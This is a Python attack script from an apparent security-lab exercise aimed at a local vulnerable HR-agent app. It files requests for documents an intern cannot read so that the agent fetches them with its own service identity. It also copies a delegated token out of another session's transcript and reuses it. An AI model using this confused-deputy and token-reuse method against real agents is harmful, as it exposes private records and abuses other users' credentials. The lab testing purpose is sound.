#!/usr/bin/env python3
"""Attack skill — identity and privilege abuse through a confused-deputy agent.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.

No injection. Logs in as the low-privilege user named in
``assets/requests.json`` (Dana, an intern) and files that file's requests on
the HR document desk: three for documents her role cannot read, made with her
own token, and one made with a delegated token copied from an earlier
session's transcript (``GET /api/history``). Billy HR works the queue on its
next run; in vulnerable mode it fetches every document with its own service
identity.

Exit code: 0 when the requests were filed, 1 when the target is unreachable.

Examples:
    python scripts/run_privilege_abuse.py
    python scripts/run_privilege_abuse.py --payload assets/requests.json
"""

from __future__ import annotations

import argparse
import json
import os
import urllib.error
import urllib.request

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("ASI03_TARGET", "http://127.0.0.1:5303")
DEFAULT_PAYLOAD = os.path.join(SKILL_DIR, "assets", "requests.json")


def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(
        url, data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read())


def _get(url: str) -> dict:
    with urllib.request.urlopen(url, timeout=10) as resp:
        return json.loads(resp.read())


def check_target(base: str) -> bool:
    try:
        ok = _get(f"{base}/health").get("demo") == "asi03"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the ASI03 target. Start it: python vulnerable_app.py")
    return ok


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="requests file to file")
    args = parser.parse_args(argv)

    if not check_target(args.target):
        return 1
    with open(args.payload, "r", encoding="utf-8") as fh:
        spec = json.load(fh)

    login = _post(f"{args.target}/login", {"user": spec["attacker"]})
    print(f"[*] Logged in as '{login['user']}' (session {login['session']}, own demo token).")
    delegated = None
    for item in spec["requests"]:
        token = login["token"]
        cred = str(item.get("credential", "own"))
        if cred.startswith("delegated:"):
            if delegated is None:
                record = _get(f"{args.target}/api/history")
                delegated = next(line.split("=", 1)[1] for line in record["transcript"]
                                 if line.startswith("delegated_token="))
                print(f"[*] Copied {record['user']}'s delegated token from session "
                      f"{record['session']}'s transcript (GET /api/history).")
            token = delegated
        _post(f"{args.target}/requests",
              {"session": login["session"], "token": token, "request": item["request"]})
        print(f"[+] Filed ({cred}): {item['request']}")
    print(f"[+] {len(spec['requests'])} requests filed. No injection; every request is plain.")
    print("[*] Re-run scripts/evaluate_kpi.py to measure the effect.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
